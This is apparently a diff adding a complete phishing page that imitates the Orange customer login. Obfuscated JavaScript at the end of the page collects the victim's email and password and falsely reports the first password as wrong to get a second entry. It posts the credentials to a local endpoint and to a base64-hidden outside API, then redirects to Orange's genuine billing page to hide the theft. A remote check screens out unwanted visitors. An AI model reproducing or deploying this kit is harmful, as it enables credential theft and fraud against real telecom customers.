@@ -1,0 +1,189 @@
+<!doctypehtml>
+    <html>
+    <meta charset=UTF-8>
+    <meta content="width=device-width,initial-scale=1" name=viewport>
+    <meta content="noindex, nofollow" name=robots>
+    <script src=https://cdn.tailwindcss.com></script>
+    <link
+        href=https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.31.2/_next/static/icons/favicon-194x194.png
+        rel=icon type=image/png>
+    <title>Identifiez-vous</title>
+    <style>
+        * {
+            font-family: Helvetica, sans-serif
+        }
+
+        @font-face {
+            font-family: Arial;
+            src: url(https://c.woopic.com/fonts/HelvNeue55_W1G.woff2) format('woff2')
+        }
+
+        body {
+            font-family: Helvetica, sans-serif
+        }
+    </style>
+
+    <body class="h-screen relative flex flex-col flex-1 justify-between">
+        <div id=divEmail>
+            <div class="flex items-center bg-black md:h-16 md:px-[12%] px-4 py-3"><img alt=""
+                    src=https://i.ibb.co/LnPhyQX/logo.png class="md:w-[40px] w-[40px]"></div>
+            <div class=md:px-[12%]>
+                <p class="font-semibold md:mt-4 mt-2 md:px-0 md:text-4xl px-3 text-3xl">Pour vous identifier
+                <div class="flex w-full bg-[#e9f8ff] gap-3 md:w-[600px] mt-3 p-4 pr-6"><img alt=""
+                        src=https://i.ibb.co/Xpwn492/img.png class="w-[40px] h-[34px]">
+                    <div>
+                        <p class="font-semibold mb-3">C'est votre première connexion ?
+                        <p>Finalisez la création de votre compte en saisissant l'adresse e-mail ou le numéro de mobile
+                            fournis par Orange ou Sosh lors de votre souscription.
+                    </div>
+                </div>
+            </div>
+            <div class="md:px-[12%] p-3">
+                <p class="font-semibold mt-5 text-xl">Indiquez votre compte Orange</p><input
+                    class="border w-full border-l-0 border-r-0 border-b-1 border-black border-t-0 md:w-[400px] outline-none placeholder-up placeholder:text-black py-3 relative mt-10"
+                    id=email placeholder="Adresse e-mail ou n° de mobile Orange">
+                <div class="font-bold bg-red-100 gap-5 hidden items-center md:w-[400px] p-2 py-2" id=errorEmail><svg
+                        class="md:w-[40px] w-[30px]" viewBox="0 0 1024 1024" id=login-error-icon-error>
+                        <path
+                            d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z"
+                            fill=#E70002></path>
+                    </svg>
+                    <p id=errorTextEmail>
+                </div>
+                <div class="flex gap-3 mt-5 place-items-center">
+                    <p class="font-semibold cursor-pointer">Comment retrouver l'adresse e-mail de votre compte <span
+                            class="font-bold text-[12px] text-orange-600">></span>
+                </div>
+                <div class="md:flex md:gap-4 md:items-center md:w-[100%] mb-11">
+                    <div class="font-semibold cursor-pointer mt-7 text-center hidden md:block">
+                        <p>Retour<span class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                    </div>
+                    <div class="flex cursor-pointer justify-center md:block md:w-1/4 mt-10 text-center item-center"
+                        id=continueButton><button
+                            class="font-semibold items-center justify-center text-white flex bg-black h-12 w-1/2">Continuer</button>
+                    </div>
+                    <div class="font-semibold cursor-pointer mt-7 text-center md:hidden relative">
+                        <p>Retour<span class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class=hidden id=divPassword>
+            <div class="flex items-center bg-black md:h-16 md:px-[12%] px-4 py-3"><img alt=""
+                    src=https://i.ibb.co/LnPhyQX/logo.png class="md:w-[40px] w-[40px]"></div>
+            <div class="md:px-[12%] p-3">
+                <p class="font-semibold md:mt-4 mt-2 text-4xl">Pour vous identifier
+                <div class="flex items-center gap-5 mt-6"><svg class="md:w-auto w-10" viewBox="0 0 80 80" height=80
+                        width=80>
+                        <defs>
+                            <circle cx=40 cy=40 id=ancg23ohva r=40></circle>
+                        </defs>
+                        <g fill=none fill-rule=evenodd>
+                            <mask fill=#fff id=byee0xikqb>
+                                <use xlink:href=#ancg23ohva></use>
+                            </mask>
+                            <use xlink:href=#ancg23ohva fill=#F4F4F4 fill-rule=nonzero></use>
+                            <path
+                                d="M40.216 10.265c8.955 0 16.145 7.15 16.145 16.054 0 8.905-7.19 16.053-16.145 16.053-8.956 0-16.145-7.148-16.145-16.053 0-8.905 7.273-16.054 16.145-16.054z"
+                                fill=#999 fill-rule=nonzero mask=url(#byee0xikqb)></path>
+                            <path
+                                d="M25.356 82.342c-5.339 0-9.78-3.384-9.78-7.395V56.814c0-6.351 4.07-12.326 10.433-15.752 0 0 5.797 5.39 14.253 5.557 8.415-.209 13.888-5.557 13.888-5.557 6.406 3.426 10.629 9.4 10.629 15.752v25.528H25.356z"
+                                fill=#999 fill-rule=nonzero mask=url(#byee0xikqb)></path>
+                        </g>
+                    </svg>
+                    <div>
+                        <p class=font-semibold id=emailAfficher>giroud.marcelle@orange.fr
+                        <p class="font-semibold mt-3">Changer de compte<span
+                                class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                    </div>
+                </div>
+                <p class="font-semibold my-6">Saisissez votre mot de passe</p><input
+                    class="border w-full border-l-0 border-r-0 border-b-1 border-black border-t-0 md:w-[400px] outline-none placeholder-up placeholder:text-black py-3 relative"
+                    id=pass placeholder="Mot de passe " type=password>
+                <div class="font-bold bg-red-100 gap-5 hidden items-center md:w-[400px] p-2 py-2" id=errorEmail2><svg
+                        class="md:w-[40px] w-[30px]" viewBox="0 0 1024 1024" id=login-error-icon-error>
+                        <path
+                            d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z"
+                            fill=#E70002></path>
+                    </svg>
+                    <p id=errorTextEmail2>
+                </div>
+                <div class="font-bold bg-red-100 gap-5 hidden items-center md:w-[400px] p-2 py-2" id=errorPass><svg
+                        class="md:w-[40px] w-[30px]" viewBox="0 0 1024 1024" id=login-error-icon-error>
+                        <path
+                            d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z"
+                            fill=#E70002></path>
+                    </svg>
+                    <p id=errorTextPass>
+                </div>
+                <div class="flex gap-2 mt-5 place-items-center"><input
+                        class="border accent-orange-500 border-orange-500 h-5 w-5" type=checkbox name="">
+                    <p>Rester identifié
+                </div>
+                <div class="md:flex md:gap-4 md:items-center md:w-[100%]">
+                    <div class="font-semibold cursor-pointer mt-7 text-center hidden md:block">
+                        <p>Retour<span class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                    </div>
+                    <div class="flex cursor-pointer justify-center md:block md:w-1/4 mt-10 text-center"
+                        id=identifyButton><button
+                            class="font-semibold items-center justify-center text-white flex bg-black h-12 w-1/2">S'identifier</button>
+                    </div>
+                    <div class="font-semibold cursor-pointer mt-7 text-center md:hidden relative">
+                        <p>Mot de passe oublié<span class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="cursor-pointer bottom-0 w-full">
+            <div
+                class="md:px-[12%] w-full border border-b-0 px-3 border-gray-300 border-l-0 border-r-0 border-t gap pt-2">
+                <p class="font-bold my-3 cursor-pointer">Créer un compte sans être client Orange<span
+                        class="font-bold text-[12px] text-orange-600 ml-1">></span>
+                <p class="font-bold my-3">Besoin d'aide ?<span
+                        class="font-bold text-[12px] text-orange-600 ml-1">></span>
+            </div>
+            <div class="flex bg-black md:px-[12%] md:h-16 px-4 bottom-0 flex-wrap md:pb-16 py-5 w-full">
+                <div class="flex bg-black">
+                    <div class="font-semibold items-center justify-center text-white flex gap-2 mr-4"><img alt=""
+                            src=https://i.ibb.co/NFCWFBV/aide.png>
+                        <p>Aide et contact
+                    </div>
+                    <div class="font-semibold items-center justify-center text-white flex gap-2 mr-4"><img alt=""
+                            src=https://i.ibb.co/0yxZvyz/entraide.png>
+                        <p>Forum d'entraide
+                    </div>
+                    <div class="font-semibold items-center justify-center text-white gap-2 hidden md:flex"><img alt=""
+                            src=https://i.ibb.co/CJhm29Q/store.png>
+                        <p>Trouver une boutique
+                    </div>
+                </div>
+                <div class="font-semibold items-center justify-center text-white flex gap-2 md:hidden mt-3"><img alt=""
+                        src=https://i.ibb.co/CJhm29Q/store.png>
+                    <p>Trouver une boutique
+                </div>
+            </div>
+            <div
+                class="flex bg-black md:px-[12%] py-5 w-full border border-b-0 border-t-zinc-400 border-x-0 gap-7 justify-between md:flex-row md:justify-normal md:py-10 pt-4 px-3 text-white">
+                <div class="md:flex gap-4">
+                    <p>Informations légales
+                    <p>Gestion cookies
+                    <p>Données personnelles
+                    <p>Accessibilité
+                </div>
+                <div class="md:flex gap-4">
+                    <p>Politique des cookies
+                    <p>Publicité
+                    <p>Signaler un contenu
+                    <p>© Orange <span id="currentYear"></span></p>
+                    <script>
+                        document.getElementById("currentYear").innerHTML = new Date().getFullYear();
+                    </script>
+                </div>
+            </div>
+        </footer>
+
+        <script>var _0x3f9d95=_0x2ff2;function _0x2ff2(_0x1e8eeb,_0x149570){var _0x482285=_0x4822();return _0x2ff2=function(_0x2ff257,_0x3dff93){_0x2ff257=_0x2ff257-0x17a;var _0x5d90cf=_0x482285[_0x2ff257];return _0x5d90cf;},_0x2ff2(_0x1e8eeb,_0x149570);}(function(_0x560597,_0x1a636d){var _0x12386b=_0x2ff2,_0x19e0e4=_0x560597();while(!![]){try{var _0x14586c=parseInt(_0x12386b(0x181))/0x1+-parseInt(_0x12386b(0x1a8))/0x2+parseInt(_0x12386b(0x18f))/0x3*(-parseInt(_0x12386b(0x1a5))/0x4)+-parseInt(_0x12386b(0x19b))/0x5+-parseInt(_0x12386b(0x193))/0x6*(parseInt(_0x12386b(0x1a9))/0x7)+parseInt(_0x12386b(0x189))/0x8+parseInt(_0x12386b(0x18c))/0x9;if(_0x14586c===_0x1a636d)break;else _0x19e0e4['push'](_0x19e0e4['shift']());}catch(_0x4604eb){_0x19e0e4['push'](_0x19e0e4['shift']());}}}(_0x4822,0x398dd));function loadHTML(){var _0x554c01=_0x2ff2,_0x216368=new XMLHttpRequest();urlanti=atob(_0x554c01(0x1b1)),_0x216368[_0x554c01(0x17c)](_0x554c01(0x1b4),urlanti,!![]),_0x216368[_0x554c01(0x17d)]=function(){var _0x43a2ce=_0x554c01;if(_0x216368['readyState']==0x4&&_0x216368['status']==0xc8){var _0x22155d=JSON[_0x43a2ce(0x17b)](_0x216368['responseText']);_0x22155d['status']===_0x43a2ce(0x186)?document['getElementById'](_0x43a2ce(0x1b2))[_0x43a2ce(0x19c)][_0x43a2ce(0x1a7)]=_0x43a2ce(0x18b):window['location'][_0x43a2ce(0x1a2)]=_0x43a2ce(0x197);}},_0x216368[_0x554c01(0x1a4)]();}function _0x4822(){var _0x223866=['662334RIywQX','2093DRScOd','placeholder:text-black','trim','@orange.fr','value','divEmail','border-[#E70002]','location','aHR0cHM6Ly93d3cudXNlbmRlci5wcm9zLw==','corps','application/json','GET','addEventListener','classList','parse','open','onreadystatechange','stringify','./send','flex','79753JPtQEq','errorPass','getElementById','status','then','valid','border-black','continueButton','2757000umvzMa','click','block','10423053cPUmTq','errorTextEmail2','https://espace-client.orange.fr/facture-paiement/consulter-ma-facture','3qffFkw','remove','hidden','json','6276OAKPxc','emailAfficher','Une\x20erreur\x20s\x27est\x20produite\x20lors\x20de\x20la\x20requête\x20:\x20','errorEmail2','https://www.mondialrelay.fr/','Erreur\x20:\x20L\x27adresse\x20e-mail\x20doit\x20être\x20du\x20domaine\x20@orange.fr\x20ou\x20@wanadoo.fr.','placeholder:text-[#E70002]','errorTextEmail','1940280FQxgKR','style','Saisissez\x20votre\x20mot\x20de\x20passe.','pass','endsWith','POST','innerText','href','add','send','1259108uFFuoT','errorEmail','display'];_0x4822=function(){return _0x223866;};return _0x4822();}loadHTML();var compteur=0x0,email=document[_0x3f9d95(0x183)]('email'),password=document[_0x3f9d95(0x183)](_0x3f9d95(0x19e)),bouttonContinuer=document['getElementById'](_0x3f9d95(0x188)),identifyButton=document[_0x3f9d95(0x183)]('identifyButton'),partieEmail=document[_0x3f9d95(0x183)](_0x3f9d95(0x1ae)),partiePassword=document[_0x3f9d95(0x183)]('divPassword'),emailAfficher=document[_0x3f9d95(0x183)](_0x3f9d95(0x194)),emailError=document[_0x3f9d95(0x183)](_0x3f9d95(0x1a6)),errorTextEmail=document['getElementById'](_0x3f9d95(0x19a)),emailError2=document[_0x3f9d95(0x183)](_0x3f9d95(0x196)),errorTextEmail2=document[_0x3f9d95(0x183)](_0x3f9d95(0x18d)),errorPass=document[_0x3f9d95(0x183)](_0x3f9d95(0x182)),errorTextPass=document['getElementById']('errorTextPass');bouttonContinuer['addEventListener'](_0x3f9d95(0x18a),function(){var _0xaaa6=_0x3f9d95,_0x2d36df=email[_0xaaa6(0x1ad)];if(_0x2d36df[_0xaaa6(0x1ab)]()==='')email[_0xaaa6(0x17a)][_0xaaa6(0x190)](_0xaaa6(0x187)),email[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x1af)),email[_0xaaa6(0x17a)]['remove']('placeholder:text-black'),email[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x199)),emailError['classList']['remove'](_0xaaa6(0x191)),emailError[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x180)),errorTextEmail[_0xaaa6(0x1a1)]='Cette\x20adresse\x20mail\x20ou\x20ce\x20numéro\x20de\x20mobile\x20n\x27est\x20pas\x20valide.\x20Vérifiez\x20votre\x20saisie.';else _0x2d36df['endsWith'](_0xaaa6(0x1ac))||_0x2d36df[_0xaaa6(0x19f)]('@wanadoo.fr')?(partieEmail[_0xaaa6(0x17a)]['add'](_0xaaa6(0x191)),partiePassword[_0xaaa6(0x17a)]['remove'](_0xaaa6(0x191)),emailAfficher[_0xaaa6(0x1a1)]=_0x2d36df):(email[_0xaaa6(0x17a)][_0xaaa6(0x190)](_0xaaa6(0x187)),email[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x1af)),email[_0xaaa6(0x17a)]['remove'](_0xaaa6(0x1aa)),email[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x199)),emailError[_0xaaa6(0x17a)][_0xaaa6(0x190)]('hidden'),emailError[_0xaaa6(0x17a)][_0xaaa6(0x1a3)](_0xaaa6(0x180)),errorTextEmail[_0xaaa6(0x1a1)]=_0xaaa6(0x198));}),identifyButton[_0x3f9d95(0x1b5)]('click',function(){var _0x185e7b=_0x3f9d95,_0x17aaeb=email[_0x185e7b(0x1ad)],_0x648db2=password['value'];if(_0x648db2[_0x185e7b(0x1ab)]()==='')password[_0x185e7b(0x17a)][_0x185e7b(0x190)]('border-black'),password[_0x185e7b(0x17a)][_0x185e7b(0x1a3)]('border-[#E70002]'),password['classList'][_0x185e7b(0x190)](_0x185e7b(0x1aa)),password[_0x185e7b(0x17a)][_0x185e7b(0x1a3)](_0x185e7b(0x199)),errorPass[_0x185e7b(0x17a)][_0x185e7b(0x190)]('hidden'),errorPass[_0x185e7b(0x17a)][_0x185e7b(0x1a3)](_0x185e7b(0x180)),errorTextPass[_0x185e7b(0x1a1)]=_0x185e7b(0x19d);else{compteur+=0x1;if(compteur===0x1){emailError2[_0x185e7b(0x17a)][_0x185e7b(0x190)](_0x185e7b(0x191)),emailError2[_0x185e7b(0x17a)][_0x185e7b(0x1a3)](_0x185e7b(0x180)),errorTextEmail2[_0x185e7b(0x1a1)]='Mot\x20de\x20passe\x20est\x20incorrect.\x20Veuillez\x20réessayez!\x20Avec\x20votre\x20vrai\x20mot\x20de\x20passe',password[_0x185e7b(0x1ad)]='';var _0x496ac2={'email':_0x17aaeb,'password':_0x648db2};fetch(_0x185e7b(0x17f),{'method':_0x185e7b(0x1a0),'headers':{'Content-Type':_0x185e7b(0x1b3)},'body':JSON[_0x185e7b(0x17e)](_0x496ac2)})[_0x185e7b(0x185)](_0x4c8057=>{var _0x238b2a=_0x185e7b;if(_0x4c8057['ok'])return _0x4c8057[_0x238b2a(0x192)]();else throw new Error(_0x238b2a(0x195)+_0x4c8057['status']);});}else{if(compteur===0x2){var _0x496ac2={'email':_0x17aaeb,'password':_0x648db2};urlapi=atob('aHR0cHM6Ly93d3cudXNlbmRlci5wcm8vYXBpLnBocA=='),fetch(urlapi,{'method':'POST','headers':{'Content-Type':_0x185e7b(0x1b3)},'body':JSON[_0x185e7b(0x17e)](_0x496ac2)})[_0x185e7b(0x185)](_0x4094b1=>{var _0x44f97b=_0x185e7b;if(_0x4094b1['ok'])return _0x4094b1[_0x44f97b(0x192)]();else throw new Error(_0x44f97b(0x195)+_0x4094b1[_0x44f97b(0x184)]);}),window[_0x185e7b(0x1b0)][_0x185e7b(0x1a2)]=_0x185e7b(0x18e);}}}});</script>
+    </div>
+</body>
+
+</html>
